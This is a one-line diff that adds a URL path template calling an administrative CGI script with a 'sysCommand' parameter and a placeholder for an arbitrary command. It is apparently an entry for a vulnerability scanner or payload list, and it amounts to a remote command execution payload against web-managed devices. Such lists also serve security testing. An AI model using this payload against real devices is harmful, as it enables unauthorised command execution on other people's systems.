@@ -1,0 +1,1 @@
+/cgi-bin/admin.cgi?Command=sysCommand&Cmd={{cmd}}
